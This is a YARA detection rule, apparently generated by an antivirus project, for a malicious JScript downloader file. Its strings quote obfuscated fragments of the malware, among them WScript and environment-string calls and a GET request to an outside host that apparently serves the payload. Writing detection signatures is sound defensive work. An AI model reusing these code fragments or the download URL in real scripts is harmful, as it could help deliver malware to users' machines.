rule sig_20160428_fe2564f2cffdb4e7aba00f43668cd30c {
  meta:
    description = "datamaliciousorder - file 20160428_fe2564f2cffdb4e7aba00f43668cd30c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4da5dd35ac53e0eeb10cf89f20b5549dbe461d3caae50089286e153e86de8a2b"

  strings:
    $s1  = "function IttTjoLqyFdbKetPkpHlc(QujLfoNpwXhaSpoYjwGmm){YmgJakHktJklMzyRolOao[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function RknDijLyzCgyWviRxvHpj() {return YmgJakHktJklMzyRolOao[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function IttTjoLqyFdbKetPkpHlc(QujLfoNpwXhaSpoYjwGmm){YmgJakHktJklMzyRolOao[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function OkoQbdCylBvbHiuQjbUcr(GksWknHfkPksWewNxtQtp, KueJkbObxMdgQuoWnmXvq){ZmsNrhSzeGxmHppVowFdj = ZmsNrhSzeGxmHppVowFdj * 1; " ascii
    $s5  = "return GksWknHfkPksWewNxtQtp - KueJkbObxMdgQuoWnmXvq;};" fullword ascii
    $s6  = "var YmgJakHktJklMzyRolOao = function KqwPafJbgVvbWdiVwtLyu() {return YylTyrFviTrbXrvErqXeg[RkpWhjNyvIsxDrmVuwCzh](\"WScript\"+\"" ascii
    $s7  = "var YmgJakHktJklMzyRolOao = function KqwPafJbgVvbWdiVwtLyu() {return YylTyrFviTrbXrvErqXeg[RkpWhjNyvIsxDrmVuwCzh](\"WScript\"+\"" ascii
    $s8  = "var YylTyrFviTrbXrvErqXeg = this[\"WScript\"];" fullword ascii
    $s9  = "return OkoQbdCylBvbHiuQjbUcr(1 == 1 ? CheZnnInmKgrOhuKdeNsb : 0, 1 == 1 ? BvwJgfTpkRmtUrbQjkGve : 0);" fullword ascii
    $s10 = "function RknDijLyzCgyWviRxvHpj() {return YmgJakHktJklMzyRolOao[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function OkoQbdCylBvbHiuQjbUcr(GksWknHfkPksWewNxtQtp, KueJkbObxMdgQuoWnmXvq){ZmsNrhSzeGxmHppVowFdj = ZmsNrhSzeGxmHppVowFdj * 1; " ascii
    $s12 = "function ZznQfjWhcKlwVkqKuiHac() {return ((JkwPyjKyhNiiBsqHdlSzs == true) && (JkwPyjKyhNiiBsqHdlSzs == XbpJdkOtfNzdPmbWkjWjy)) ?" ascii
    $s13 = "function ZznQfjWhcKlwVkqKuiHac() {return ((JkwPyjKyhNiiBsqHdlSzs == true) && (JkwPyjKyhNiiBsqHdlSzs == XbpJdkOtfNzdPmbWkjWjy)) ?" ascii
    $s14 = "JsaDhuCafIvgOokCxlMiq[StdQtpRoxItjDjzTvsKzw](\"G\" + \"ET\", \"http://demo.sinelnikds.ru/b6sida\", false);" fullword ascii
    $s15 = "var JkwPyjKyhNiiBsqHdlSzs = false;" fullword ascii
    $s16 = "function XwdNesYxeGexDowDwyZyl(){return 23;};" fullword ascii
    $s17 = "var XbgJviDaqQzuMyrYtjXuq = new this[\"D\"+\"ate\"]();" fullword ascii
    $s18 = "function BnoVfiUevDhwNsnEqxWyj(){return EqiKxgQtyLvwMjsZcrCah + \"\";};" fullword ascii
    $s19 = "JkwPyjKyhNiiBsqHdlSzs = true; " fullword ascii
    $s20 = "function WatSdoDalNcpJtjVzzQay(){return RkpWhjNyvIsxDrmVuwCzh;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}